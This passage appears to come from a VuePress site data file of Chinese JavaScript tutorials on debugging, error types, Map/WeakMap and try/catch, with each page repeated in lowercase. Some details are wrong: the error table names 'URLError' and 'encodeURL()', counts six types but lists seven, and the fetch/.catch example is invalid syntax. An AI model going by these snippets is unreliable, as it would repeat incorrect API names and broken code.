时，如果没有调试工具将是一件很痛苦的事情。\n\n在程序代码中寻找错误叫做代码调试。\n\n调试很难，但幸运的是，很多浏览器都内置了调试工具。\n\n\n# debugger 关键字\n\ndebugger 关键字用于停止执行 javascript，并调用调试函数。\n\n这个关键字与在调试工具中设置断点的效果是一样的。\n\n开启 debugger ，代码在第三行前停止执行。\n\nvar title = "hello world!";\ndebugger;\ndocument.queryselector("#box").innerhtml = title;\n\n\n> 注意：如果没有调试可用，debugger 语句将无法工作。',charsets:{cjk:!0}},{title:"JavaScript错误与异常",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/JavaScript%E9%94%99%E8%AF%AF%E4%B8%8E%E5%BC%82%E5%B8%B8.html",relativePath:"Javascript/Javascript基础语法/12-错误调试/JavaScript错误与异常.md",key:"v-34775b24",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/JavaScript%E9%94%99%E8%AF%AF%E4%B8%8E%E5%BC%82%E5%B8%B8.html",headers:[{level:2,title:"错误类型",slug:"错误类型",normalizedTitle:"错误类型",charIndex:61},{level:3,title:"语法错误",slug:"语法错误",normalizedTitle:"语法错误",charIndex:102},{level:3,title:"逻辑错误",slug:"逻辑错误",normalizedTitle:"逻辑错误",charIndex:341}],headersStr:"错误类型 语法错误 逻辑错误",content:"# JavaScript错误与异常\n\n> 通常，你在编写一个新的 JavaScript 代码过程中都会发生错误。\n\n\n# 错误类型\n\n一般来说，当你的代码出错的时候，你会遇到两种主要的错误类型：\n\n\n# 语法错误\n\n这是你的代码的拼写错误，实际上导致程序不能运行在所有或停止通过工作的一部分，这样你通常会用一些提供的错误消息找到修复的方法，只要你熟悉正确的工具，知道错误消息的意思！\n\n一般来说，JavaScript引擎会在代码装入时先进行语法分析，如果语法分析通不过，整个脚本代码块都不会执行；(如一个人在演讲时，先检查演讲稿语句是否通顺，不通顺则不讲)\n\n当语法分析通过时，才会执行这段脚本代码。若在执行过程中出错，那么在同一代码上下文中、出错点之后的代码将不再执行。\n\n\n# 逻辑错误\n\n这些错误，其中语法实际上是正确的，但代码是不是你想要的，这意味着项目成功运行，但会产生不正确的结果。这些通常比语法错误更难以修复，因为通常没有错误指向错误源。",normalizedContent:"# javascript错误与异常\n\n> 通常，你在编写一个新的 javascript 代码过程中都会发生错误。\n\n\n# 错误类型\n\n一般来说，当你的代码出错的时候，你会遇到两种主要的错误类型：\n\n\n# 语法错误\n\n这是你的代码的拼写错误，实际上导致程序不能运行在所有或停止通过工作的一部分，这样你通常会用一些提供的错误消息找到修复的方法，只要你熟悉正确的工具，知道错误消息的意思！\n\n一般来说，javascript引擎会在代码装入时先进行语法分析，如果语法分析通不过，整个脚本代码块都不会执行；(如一个人在演讲时，先检查演讲稿语句是否通顺，不通顺则不讲)\n\n当语法分析通过时，才会执行这段脚本代码。若在执行过程中出错，那么在同一代码上下文中、出错点之后的代码将不再执行。\n\n\n# 逻辑错误\n\n这些错误，其中语法实际上是正确的，但代码是不是你想要的，这意味着项目成功运行，但会产生不正确的结果。这些通常比语法错误更难以修复，因为通常没有错误指向错误源。",charsets:{cjk:!0}},{title:"Map && WeakMap",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/10-Map%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html",relativePath:"Javascript/Javascript基础语法/10-Map数据结构.md",key:"v-42b03843",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/10-Map%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84.html",headers:[{level:2,title:"Map",slug:"map",normalizedTitle:"map",charIndex:2},{level:3,title:"概述",slug:"概述",normalizedTitle:"概述",charIndex:29},{level:3,title:"基本用法",slug:"基本用法",normalizedTitle:"基本用法",charIndex:227},{level:3,title:"Map 属性",slug:"map-属性",normalizedTitle:"map 属性",charIndex:1197},{level:3,title:"Map 操作方法",slug:"map-操作方法",normalizedTitle:"map 操作方法",charIndex:1357},{level:3,title:"Map 遍历方法",slug:"map-遍历方法",normalizedTitle:"map 遍历方法",charIndex:2557},{level:3,title:"Map && 数组",slug:"map-数组",normalizedTitle:"map &amp;&amp; 数组",charIndex:null},{level:3,title:"Map && 对象",slug:"map-对象",normalizedTitle:"map &amp;&amp; 对象",charIndex:null},{level:2,title:"WeakMap",slug:"weakmap",normalizedTitle:"weakmap",charIndex:9}],headersStr:"Map 概述 基本用法 Map 属性 Map 操作方法 Map 遍历方法 Map && 数组 Map && 对象 WeakMap",content:"# Map && WeakMap\n\n\n# Map\n\n\n# 概述\n\n> javascript对象，本质上是键值对的集合。之前，只能用字符串当做键。\n> Map数据结构类似于对象，也是键值对的集合，但是\"键\"的范围不限于字符串，各种类型的值（包括对象）都可以当作键。\n> Object结构提供了\"字符串—值\"的对应，Map结构提供了\"值—值\"的对应，是一种更完善的Hash结构实现。\n> 所以需要\"键值对\"的数据结构时，Map比Object更合适。\n\n\n# 基本用法\n\n * Map 作为一个构造函数，可以接受一个数组当做参数。\n * Map 结构中，字符串\"true\" 和 布尔值true 是两个不同的键值。\n\n  var map = new Map([\n      [true, 'one'],\n      ['true', 'two']\n  ]);\n\n  console.log(map.get(true)) // 'one'\n  console.log(map.get('true')) // 'two'\n\n\nMap构造函数接受数组作为参数，实际上执行的是下面的算法。\n\nconst items = [\n    ['name', '张三'],\n    ['title', 'Author']\n];\n\nconst map = new Map();\n\nitems.forEach(\n    ([key, value]) => map.set(key, value)\n);\n\n\n * 只有对同一个对象的引用，Map结构才将其视为同一个键。所以下例中 set 和 get 中的 [1] 不是同一个键。\n * 虽然NaN不严格相等于自身，但Map将其视为同一个键。\n\n  var map = new Map();\n\n  map.set([1], 111);\n  map.set(NaN, 222);\n  console.log(map.get([1])); // undefined\n  console.log(map.get(NaN)); // 222\n\n\n如果对同一个键多次赋值，后面的值将覆盖前面的值。\n\nconst map = new Map();\n\nmap\n    .set(1, 'aaa')\n    .set(1, 'bbb');\n\nmap.get(1) // \"bbb\"\n\n\nTIP\n\n注意，只有对同一个对象的引用，Map 结构才将其视为同一个键。这一点要非常小心。\n\nconst map = new Map();\n\nmap.set(['a'], 555);\nmap.get(['a']) // undefined\n// 代码的set和get方法，表面是针对同一个键，但实际上这是两个不同的数组实例，内存地址是不一样的，因此get方法无法读取该键，返回undefined。\n\n\n\n# Map 属性\n\n * size 返回 Map结构的成员个数。\n\n  var map = new Map([\n      [true, 'one'],\n      ['true', 'two']\n  ]);\n\n  map.set([1], 111);\n  console.log(map.size); // 3\n\n\n\n# Map 操作方法\n\n * set() 方法返回的是Map本身，因此也可以采用链式写法。\n\n  var map = new Map()\n      .set(1, 'a')\n      .set(2, 'b');\n  map.set(3, 'c')\n  console.log(map) // Map {1 => \"a\", 2 => \"b\", 3 => \"c\"}\n\n\n * get() 方法读取对应的键值，如果找不到传入的键值，返回undefined。\n\n  var map = new Map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.get(1)) //'a'\n  console.log(map.get(2)) //'b'\n  console.log(map.get(3)) //'c'\n\n\n * has() 方法返回一个布尔值，表示该键值是否在 Map 结构中。\n\n  var map = new Map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.has(2)) //  true\n  console.log(map.has(4)) //  false\n\n\n * delete() 方法删除某个键，返回true。如果删除失败，返回false。\n\n  var map = new Map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.has(2)); //  true\n  console.log(map.delete(2)); // true\n  console.log(map.has(2)); // false\n  console.log(map.delete(4)); // false\n\n\n * clear() 方法清除所有成员，没有返回值。\n\n  var map = new Map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map); // Map {1 => \"a\", 2 => \"b\", 3 => \"c\"}\n\n\n  var map = new Map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.clear()); // undefined\n  console.log(map); // Map {}\n\n\n\n# Map 遍历方法\n\n * keys()：返回键名的遍历器。\n * values()：返回键值的遍历器。\n * entries()：返回所有成员的遍历器。\n * forEach(): 遍历 Map 的所有成员。\n\nTIP\n\nMap 的遍历顺序就是插入顺序。\n\n  var map = new Map([\n      ['name', 'bob'],\n      ['age', 18],\n  ]);\n\n  for (let key of map.keys()) {\n      console.log(key);\n      // name\n      // age\n  }\n\n  for (let value of map.values()) {\n      console.log(value);\n      // bob\n      // 18\n  }\n\n  for (let kv of map.entries()) {\n      console.log(kv[0], kv[1]);\n      // name bob\n      // age 18\n  }\n\n  for (let [key, value] of map.entries()) {\n      console.log(key, value);\n      // name bob\n      // age 18\n  }\n\n  for (let [key, value] of map) {\n      console.log(key, value);\n      // name bob\n      // age 18\n  }\n\n\n\n# Map && 数组\n\n * Map 转为 数组\n\n  var myMap = new Map().set(false, 0).set({\n      aa: 1\n  }, [2, 3]);\n  var arr = [...myMap];\n  console.log(arr)\n  // [ [ false, 0 ], [ { aa: 1 }, [ 2, 3 ] ] ]\n\n\n * 数组 转为 Map\n\n  var yMap = new Map([\n      [false, 0],\n      [{\n              aa: 1\n          },\n          [2, 3]\n      ]\n  ]);\n  console.log(yMap);\n  // Map {false => 0, Object {aa: 1} => [2, 3]}\n\n\n\n# Map && 对象\n\n * Map 转为 对象\n   \n   > 如果所有Map的键都是字符串，它可以转为对象。\n\n  function strMapToObj(strMap) {\n      let obj = Object.create(null);\n      for (let [k, v] of strMap) {\n          obj[k] = v;\n      }\n      return obj;\n  }\n\n  var myMap = new Map().set('yes', true).set('no', false);\n  strMapToObj(myMap)\n  // { yes: true, no: false }\n\n\n * 对象 转为 Map\n\n  function objToStrMap(obj) {\n      let strMap = new Map();\n      for (let k of Object.keys(obj)) {\n          strMap.set(k, obj[k]);\n      }\n      return strMap;\n  }\n\n  objToStrMap({\n      yes: true,\n      no: false\n  })\n\n\n * Map 转为 JSON\n\nMap 转为 JSON 要区分两种情况。一种情况是，Map 的键名都是字符串，这时可以选择转为对象 JSON。\n\nfunction strMapToJson(strMap) {\n    return JSON.stringify(strMapToObj(strMap));\n}\n\nlet myMap = new Map().set('yes', true).set('no', false);\nstrMapToJson(myMap)\n// '{\"yes\":true,\"no\":false}'\n\n\n另一种情况是，Map 的键名有非字符串，这时可以选择转为数组 JSON。\n\nfunction mapToArrayJson(map) {\n    return JSON.stringify([...map]);\n}\n\nlet myMap = new Map().set(true, 7).set({\n    foo: 3\n}, ['abc']);\nmapToArrayJson(myMap)\n// '[[true,7],[{\"foo\":3},[\"abc\"]]]'\n\n\n * JSON 转为 Map JSON 转为 Map，正常情况下，所有键名都是字符串。\n\nfunction jsonToStrMap(jsonStr) {\n    return objToStrMap(JSON.parse(jsonStr));\n}\n\njsonToStrMap('{\"yes\": true, \"no\": false}')\n// Map {'yes' => true, 'no' => false}\n\n\n整个 JSON 就是一个数组，且每个数组成员本身，又是一个有两个成员的数组。这时，它可以一一对应地转为 Map。这往往是 Map 转为数组 JSON 的逆操作。\n\nfunction jsonToMap(jsonStr) {\n    return new Map(JSON.parse(jsonStr));\n}\n\njsonToMap('[[true,7],[{\"foo\":3},[\"abc\"]]]')\n// Map {true => 7, Object {foo: 3} => ['abc']}\n\n\n\n# WeakMap\n\n * WeakMap结构与Map结构基本类似，唯一的区别是它只接受对象作为键名（null除外），不接受其他类型的值作为键名。\n * 键名所指向的对象，不计入垃圾回收机制。\n\n  var map = new WeakMap()\n  map.set(1, 2); // Uncaught TypeError: Invalid value used as weak map key\n  map.set(Symbol(), 2); // Uncaught TypeError: Invalid value used as weak map key\n",normalizedContent:"# map && weakmap\n\n\n# map\n\n\n# 概述\n\n> javascript对象，本质上是键值对的集合。之前，只能用字符串当做键。\n> map数据结构类似于对象，也是键值对的集合，但是\"键\"的范围不限于字符串，各种类型的值（包括对象）都可以当作键。\n> object结构提供了\"字符串—值\"的对应，map结构提供了\"值—值\"的对应，是一种更完善的hash结构实现。\n> 所以需要\"键值对\"的数据结构时，map比object更合适。\n\n\n# 基本用法\n\n * map 作为一个构造函数，可以接受一个数组当做参数。\n * map 结构中，字符串\"true\" 和 布尔值true 是两个不同的键值。\n\n  var map = new map([\n      [true, 'one'],\n      ['true', 'two']\n  ]);\n\n  console.log(map.get(true)) // 'one'\n  console.log(map.get('true')) // 'two'\n\n\nmap构造函数接受数组作为参数，实际上执行的是下面的算法。\n\nconst items = [\n    ['name', '张三'],\n    ['title', 'author']\n];\n\nconst map = new map();\n\nitems.foreach(\n    ([key, value]) => map.set(key, value)\n);\n\n\n * 只有对同一个对象的引用，map结构才将其视为同一个键。所以下例中 set 和 get 中的 [1] 不是同一个键。\n * 虽然nan不严格相等于自身，但map将其视为同一个键。\n\n  var map = new map();\n\n  map.set([1], 111);\n  map.set(nan, 222);\n  console.log(map.get([1])); // undefined\n  console.log(map.get(nan)); // 222\n\n\n如果对同一个键多次赋值，后面的值将覆盖前面的值。\n\nconst map = new map();\n\nmap\n    .set(1, 'aaa')\n    .set(1, 'bbb');\n\nmap.get(1) // \"bbb\"\n\n\ntip\n\n注意，只有对同一个对象的引用，map 结构才将其视为同一个键。这一点要非常小心。\n\nconst map = new map();\n\nmap.set(['a'], 555);\nmap.get(['a']) // undefined\n// 代码的set和get方法，表面是针对同一个键，但实际上这是两个不同的数组实例，内存地址是不一样的，因此get方法无法读取该键，返回undefined。\n\n\n\n# map 属性\n\n * size 返回 map结构的成员个数。\n\n  var map = new map([\n      [true, 'one'],\n      ['true', 'two']\n  ]);\n\n  map.set([1], 111);\n  console.log(map.size); // 3\n\n\n\n# map 操作方法\n\n * set() 方法返回的是map本身，因此也可以采用链式写法。\n\n  var map = new map()\n      .set(1, 'a')\n      .set(2, 'b');\n  map.set(3, 'c')\n  console.log(map) // map {1 => \"a\", 2 => \"b\", 3 => \"c\"}\n\n\n * get() 方法读取对应的键值，如果找不到传入的键值，返回undefined。\n\n  var map = new map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.get(1)) //'a'\n  console.log(map.get(2)) //'b'\n  console.log(map.get(3)) //'c'\n\n\n * has() 方法返回一个布尔值，表示该键值是否在 map 结构中。\n\n  var map = new map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.has(2)) //  true\n  console.log(map.has(4)) //  false\n\n\n * delete() 方法删除某个键，返回true。如果删除失败，返回false。\n\n  var map = new map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.has(2)); //  true\n  console.log(map.delete(2)); // true\n  console.log(map.has(2)); // false\n  console.log(map.delete(4)); // false\n\n\n * clear() 方法清除所有成员，没有返回值。\n\n  var map = new map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map); // map {1 => \"a\", 2 => \"b\", 3 => \"c\"}\n\n\n  var map = new map()\n      .set(1, 'a')\n      .set(2, 'b')\n      .set(3, 'c');\n\n  console.log(map.clear()); // undefined\n  console.log(map); // map {}\n\n\n\n# map 遍历方法\n\n * keys()：返回键名的遍历器。\n * values()：返回键值的遍历器。\n * entries()：返回所有成员的遍历器。\n * foreach(): 遍历 map 的所有成员。\n\ntip\n\nmap 的遍历顺序就是插入顺序。\n\n  var map = new map([\n      ['name', 'bob'],\n      ['age', 18],\n  ]);\n\n  for (let key of map.keys()) {\n      console.log(key);\n      // name\n      // age\n  }\n\n  for (let value of map.values()) {\n      console.log(value);\n      // bob\n      // 18\n  }\n\n  for (let kv of map.entries()) {\n      console.log(kv[0], kv[1]);\n      // name bob\n      // age 18\n  }\n\n  for (let [key, value] of map.entries()) {\n      console.log(key, value);\n      // name bob\n      // age 18\n  }\n\n  for (let [key, value] of map) {\n      console.log(key, value);\n      // name bob\n      // age 18\n  }\n\n\n\n# map && 数组\n\n * map 转为 数组\n\n  var mymap = new map().set(false, 0).set({\n      aa: 1\n  }, [2, 3]);\n  var arr = [...mymap];\n  console.log(arr)\n  // [ [ false, 0 ], [ { aa: 1 }, [ 2, 3 ] ] ]\n\n\n * 数组 转为 map\n\n  var ymap = new map([\n      [false, 0],\n      [{\n              aa: 1\n          },\n          [2, 3]\n      ]\n  ]);\n  console.log(ymap);\n  // map {false => 0, object {aa: 1} => [2, 3]}\n\n\n\n# map && 对象\n\n * map 转为 对象\n   \n   > 如果所有map的键都是字符串，它可以转为对象。\n\n  function strmaptoobj(strmap) {\n      let obj = object.create(null);\n      for (let [k, v] of strmap) {\n          obj[k] = v;\n      }\n      return obj;\n  }\n\n  var mymap = new map().set('yes', true).set('no', false);\n  strmaptoobj(mymap)\n  // { yes: true, no: false }\n\n\n * 对象 转为 map\n\n  function objtostrmap(obj) {\n      let strmap = new map();\n      for (let k of object.keys(obj)) {\n          strmap.set(k, obj[k]);\n      }\n      return strmap;\n  }\n\n  objtostrmap({\n      yes: true,\n      no: false\n  })\n\n\n * map 转为 json\n\nmap 转为 json 要区分两种情况。一种情况是，map 的键名都是字符串，这时可以选择转为对象 json。\n\nfunction strmaptojson(strmap) {\n    return json.stringify(strmaptoobj(strmap));\n}\n\nlet mymap = new map().set('yes', true).set('no', false);\nstrmaptojson(mymap)\n// '{\"yes\":true,\"no\":false}'\n\n\n另一种情况是，map 的键名有非字符串，这时可以选择转为数组 json。\n\nfunction maptoarrayjson(map) {\n    return json.stringify([...map]);\n}\n\nlet mymap = new map().set(true, 7).set({\n    foo: 3\n}, ['abc']);\nmaptoarrayjson(mymap)\n// '[[true,7],[{\"foo\":3},[\"abc\"]]]'\n\n\n * json 转为 map json 转为 map，正常情况下，所有键名都是字符串。\n\nfunction jsontostrmap(jsonstr) {\n    return objtostrmap(json.parse(jsonstr));\n}\n\njsontostrmap('{\"yes\": true, \"no\": false}')\n// map {'yes' => true, 'no' => false}\n\n\n整个 json 就是一个数组，且每个数组成员本身，又是一个有两个成员的数组。这时，它可以一一对应地转为 map。这往往是 map 转为数组 json 的逆操作。\n\nfunction jsontomap(jsonstr) {\n    return new map(json.parse(jsonstr));\n}\n\njsontomap('[[true,7],[{\"foo\":3},[\"abc\"]]]')\n// map {true => 7, object {foo: 3} => ['abc']}\n\n\n\n# weakmap\n\n * weakmap结构与map结构基本类似，唯一的区别是它只接受对象作为键名（null除外），不接受其他类型的值作为键名。\n * 键名所指向的对象，不计入垃圾回收机制。\n\n  var map = new weakmap()\n  map.set(1, 2); // uncaught typeerror: invalid value used as weak map key\n  map.set(symbol(), 2); // uncaught typeerror: invalid value used as weak map key\n",charsets:{cjk:!0}},{title:"错误处理",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86.html",relativePath:"Javascript/Javascript基础语法/12-错误调试/错误处理.md",key:"v-01b4c3e0",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/12-%E9%94%99%E8%AF%AF%E8%B0%83%E8%AF%95/%E9%94%99%E8%AF%AF%E5%A4%84%E7%90%86.html",headers:[{level:2,title:"Error对象",slug:"error对象",normalizedTitle:"error对象",charIndex:87},{level:3,title:"预定义错误类型",slug:"预定义错误类型",normalizedTitle:"预定义错误类型",charIndex:180},{level:3,title:"自定义错误类型",slug:"自定义错误类型",normalizedTitle:"自定义错误类型",charIndex:511},{level:2,title:"错误处理",slug:"错误处理-2",normalizedTitle:"错误处理",charIndex:2},{level:3,title:"try...catch语句",slug:"try-catch语句",normalizedTitle:"try...catch语句",charIndex:808},{level:3,title:"throw 抛出语句",slug:"throw-抛出语句",normalizedTitle:"throw 抛出语句",charIndex:1500},{level:2,title:"错误处理使用场景：",slug:"错误处理使用场景",normalizedTitle:"错误处理使用场景：",charIndex:1917},{level:3,title:"同步场景中的错误",slug:"同步场景中的错误",normalizedTitle:"同步场景中的错误",charIndex:1931},{level:3,title:"异步函数中的错误",slug:"异步函数中的错误",normalizedTitle:"异步函数中的错误",charIndex:2341}],headersStr:"Error对象 预定义错误类型 自定义错误类型 错误处理 try...catch语句 throw 抛出语句 错误处理使用场景： 同步场景中的错误 异步函数中的错误",content:'# 错误处理\n\n错误，指程序中的非正常运行状态，在其他编程语言中称为‘异常’或，‘错误’。解释器为每个错误情形创建并抛出一个error对象，其中包含错误的描述信息。\n\n\n# Error对象\n\nECMAScript预定义了六种类型的错误。执行代码期间可能会发生的错误类型有多种种类，每种种类都有对应的错误类型。当错误发生时，就会抛出对应类型的错误对象。\n\n\n# 预定义错误类型\n\n错误类型             说明\nReferenceError   表示错误的原因：无效引用，所使用的数据未定义\nRangeError       表示错误的原因：数值变量或参数超出其有效范围\nTypeError        表示错误的原因：变量或参数部属于有效类型\nInternalError    表示javascript引擎内部错误的异常\nEvalError        表示错误的原因：与eval()有关\nSyntaxError      表示错误的原因：eval()在解析代码的过程发生的语法错误\nURLError         表示错误的原因：给encodeURL()或decodeURL()传递的参数无效\n\n\n\n\n# 自定义错误类型\n\n除了浏览器预定义的六种错误类型，开发人员可自定义错误并进行处理(处理方法见下)：\n\nnew Error("提示信息")\n\n\n\n\n\n# 错误处理\n\n> 通过使用JavaScript提供的异常处理语句，可以用结构优化的方式捕捉发生的错误，让异常处理代码核心业务代码实现分离。\n\n出错行以下的所有JS代码将中停执行，这是我们不希望看到的，果我们能获取 这些Error，然后弹出一些友好界面会有更好的体验。 所以说，对于拿不准的代码段、容易报错或产生兼容问题的代码段/语句块加上错误处理。\n\n * 解决浏览器兼容性问题\n * 引用外部函数库，不确定函数库返回的结果正确与否。\n\n\n# try...catch语句\n\ntry...catch 语句作为js中处理异常的一种标准方式。try语句标记一块待尝试的语句，如果该语句出现错误，则通过catch语句进行捕捉。\n\n * try 语句允许我们定义在执行时进行错误测试的代码块。\n * catch 语句允许我们定义当 try 代码块发生错误时，所执行的代码块。\n   * catch语句中可接收到错误对象，对象上有两个常用属性\n     * name：错误类型\n     * message：错误信息\n * finally 语句指不管try误与异常，都会执行的代码块。\n   * 在 finally 中我们可以放置我们必须要执行的代码。\n   * finally可以省略 JavaScript 语句 try 和 catch 是成对出现的。\n\ntry {\n    console.log(v);//- 调用未定义的变量，语法报错\n}\n//用于处理try中出现的错误\ncatch (error){\n    //error - 表示try中出现错误的信息对象\n    console.log(error.name);\n    console.log(error.message);\n}\n//终结快 - 无论catch语句是否处理了try语句中的错误与异常，都会输出finally语句中的内容\nfinally {\n\n}\n\n\n# 注意事项\n\n 1. try...catch只能捕获在其中执行的同步代码所抛出的异常，异步异常无法捕获\n 2. try...catch会降低能，所以只将可能出错的代码片段放入try...catch\n\n\n# throw 抛出语句\n\n与try...catch语句配合使用的还有throw操作符，用于随时抛出定义错误。抛出错误是，必须给throw操作符制定一个值。（值不限类型）\n\nfunction fn(v) {\n    if (v){\n        return v;\n    }else {\n        throw {name : \'错误\'};\n    }\n}\n\nvar result;\ntry{\n    result=fn();\n}catch (e){\n    result = \'aa\'\n    console.log(e.name);//错误\n}\nconsole.log(result);//aa\n\n\nthrow常常会和 Error对象结合使用，用以抛出一个错误：\n\nthrow new Error("参数类型错误");\n\n\n * https://segmentfault.com/a/1190000016115486\n\n\n# 错误处理使用场景：\n\n\n# 同步场景中的错误\n\n 1. 获取DOM元素进行DOM操作，如果未获取到元素需要进行错误判断\n\ndocument.querySelector(".box").onclick = function(){\n    // do something\n}\n// 如果未获取到元素则js代码会报错停止执行\n\n\n错误处理\n\ntry {\n    document.querySelector(".box").onclick = function () {\n        // do something\n    }\n} catch (error) {\n    console.log("未获取到元素")\n}\n\n\n 2. 兼容性错误\n\ntry {\n    div.addEventListener(doSomething)\n} catch (error) {\n    div.attachEvent(doSomething)\n}\n\n\n\n# 异步函数中的错误\n\n由于try...catch只能捕获同步代码,所以在异步函数外部使用try...catch是错误的：\n\ntry {\n\tajax({})\n} catch (e) {\n    // 无法捕获到异步函数的错误\n}\n\n\n所以，回调函数的的错误处理只能在回调函数的内部处理.例如\n\najax({\n    success(){\n        try{\n\n        }catch(e){\n\n        }\n    }\n})\n\n\n或者使用Promise语法中的catch来捕获异步函数的错误：\n\nfetch(url, options)\n.then(res=>{\n    return res.json()\n}\n.catch(error){\n    // 利用Promise语法在catch中捕获错误\n}\n',normalizedContent:'# 错误处理\n\n错误，指程序中的非正常运行状态，在其他编程语言中称为‘异常’或，‘错误’。解释器为每个错误情形创建并抛出一个error对象，其中包含错误的描述信息。\n\n\n# error对象\n\necmascript预定义了六种类型的错误。执行代码期间可能会发生的错误类型有多种种类，每种种类都有对应的错误类型。当错误发生时，就会抛出对应类型的错误对象。\n\n\n# 预定义错误类型\n\n错误类型             说明\nreferenceerror   表示错误的原因：无效引用，所使用的数据未定义\nrangeerror       表示错误的原因：数值变量或参数超出其有效范围\ntypeerror        表示错误的原因：变量或参数部属于有效类型\ninternalerror    表示javascript引擎内部错误的异常\nevalerror        表示错误的原因：与eval()有关\nsyntaxerror      表示错误的原因：eval()在解析代码的过程发生的语法错误\nurlerror         表示错误的原因：给encodeurl()或decodeurl()传递的参数无效\n\n\n\n\n# 自定义错误类型\n\n除了浏览器预定义的六种错误类型，开发人员可自定义错误并进行处理(处理方法见下)：\n\nnew error("提示信息")\n\n\n\n\n\n# 错误处理\n\n> 通过使用javascript提供的异常处理语句，可以用结构优化的方式捕捉发生的错误，让异常处理代码核心业务代码实现分离。\n\n出错行以下的所有js代码将中停执行，这是我们不希望看到的，果我们能获取 这些error，然后弹出一些友好界面会有更好的体验。 所以说，对于拿不准的代码段、容易报错或产生兼容问题的代码段/语句块加上错误处理。\n\n * 解决浏览器兼容性问题\n * 引用外部函数库，不确定函数库返回的结果正确与否。\n\n\n# try...catch语句\n\ntry...catch 语句作为js中处理异常的一种标准方式。try语句标记一块待尝试的语句，如果该语句出现错误，则通过catch语句进行捕捉。\n\n * try 语句允许我们定义在执行时进行错误测试的代码块。\n * catch 语句允许我们定义当 try 代码块发生错误时，所执行的代码块。\n   * catch语句中可接收到错误对象，对象上有两个常用属性\n     * name：错误类型\n     * message：错误信息\n * finally 语句指不管try误与异常，都会执行的代码块。\n   * 在 finally 中我们可以放置我们必须要执行的代码。\n   * finally可以省略 javascript 语句 try 和 catch 是成对出现的。\n\ntry {\n    console.log(v);//- 调用未定义的变量，语法报错\n}\n//用于处理try中出现的错误\ncatch (error){\n    //error - 表示try中出现错误的信息对象\n    console.log(error.name);\n    console.log(error.message);\n}\n//终结快 - 无论catch语句是否处理了try语句中的错误与异常，都会输出finally语句中的内容\nfinally {\n\n}\n\n\n# 注意事项\n\n 1. try...catch只能捕获在其中执行的同步代码所抛出的异常，异步异常无法捕获\n 2. try...catch会降低能，所以只将可能出错的代码片段放入try...catch\n\n\n# throw 抛出语句\n\n与try...catch语句配合使用的还有throw操作符，用于随时抛出定义错误。抛出错误是，必须给throw操作符制定一个值。（值不限类型）\n\nfunction fn(v) {\n    if (v){\n        return v;\n    }else {\n        throw {name : \'错误\'};\n    }\n}\n\nvar result;\ntry{\n    result=fn();\n}catch (e){\n    result = \'aa\'\n    console.log(e.name);//错误\n}\nconsole.log(result);//aa\n\n\nthrow常常会和 error对象结合使用，用以抛出一个错误：\n\nthrow new error("参数类型错误");\n\n\n * https://segmentfault.com/a/1190000016115486\n\n\n# 错误处理使用场景：\n\n\n# 同步场景中的错误\n\n 1. 获取dom元素进行dom操作，如果未获取到元素需要进行错误判断\n\ndocument.queryselector(".box").onclick = function(){\n    // do something\n}\n// 如果未获取到元素则js代码会报错停止执行\n\n\n错误处理\n\ntry {\n    document.queryselector(".box").onclick = function () {\n        // do something\n    }\n} catch (error) {\n    console.log("未获取到元素")\n}\n\n\n 2. 兼容性错误\n\ntry {\n    div.addeventlistener(dosomething)\n} catch (error) {\n    div.attachevent(dosomething)\n}\n\n\n\n# 异步函数中的错误\n\n由于try...catch只能捕获同步代码,所以在异步函数外部使用try...catch是错误的：\n\ntry {\n\tajax({})\n} catch (e) {\n    // 无法捕获到异步函数的错误\n}\n\n\n所以，回调函数的的错误处理只能在回调函数的内部处理.例如\n\najax({\n    success(){\n        try{\n\n        }catch(e){\n\n        }\n    }\n})\n\n\n或者使用promise语法中的catch来捕获异步函数的错误：\n\nfetch(url, options)\n.then(res=>{\n    return res.json()\n}\n.catch(error){\n    // 利用promise语法在catch中捕获错误\n}\n',charsets:{cjk:!0}},{title:"ECMAScript新特性",frontmatter:{},regularPath:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/11-ES%E6%96%B0%E7%89%B9%E6%80%A7.html",relativePath:"Javascript/Javascript基础语法/11-ES新特性.md",key:"v-15338e13",path:"/Javascript/Javascript%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95/11-ES%E6%96%B0%E7%89%B9%E6%80%A7.html",headers:[{level:2,title:"ECMAScript版本",slug:"ecmascript版本",normalizedTitle:"ecmascript版本",charIndex:158},{level:2,title:"ES2015 新特性",slug:"es2015-新特性",normalizedTitle:"es2015 新特性",charIndex:415},{level:2,title:"ES2016 新特性",slug:"es2016-新特性",normalizedTitle:"es2016 新特性",charIndex:2304},{level:2,title:"ES2017 新特性",slug:"es2017-新特性",normalizedTitle:"es2017 新特性",charIndex:2405},{level:2,title:"ES2018 新特性",slug:"es2018-新特性",normalizedTitle:"es2018 新特性",charIndex:2818}],headersStr:"ECMAScript版本 ES2015 新特性 ES2016 新特性 ES2017 新特性 